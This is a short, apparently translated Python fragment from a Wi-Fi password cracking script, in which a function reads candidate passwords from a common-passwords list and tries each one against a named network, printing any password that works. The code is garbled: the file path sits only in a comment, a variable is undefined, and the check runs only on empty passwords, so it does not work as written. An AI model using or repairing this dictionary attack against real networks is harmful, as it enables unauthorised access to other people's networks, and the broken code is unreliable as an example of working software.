def beginwork(wifinamelist):
    ifaces = getifaces()
         # Path = r "password- commonly used passwords .txt"
    files = open(path, 'r')
    while True:

        password = files.readline()
        password = password.strip('\n')
        if not password:
            if testwifi(ifaces, wifiname, password):
               print ( "Wifi account:" + wifiname + ", Wifi password:" + password)
               wifinamelist.remove(wifiname)
               break

    files.close()
 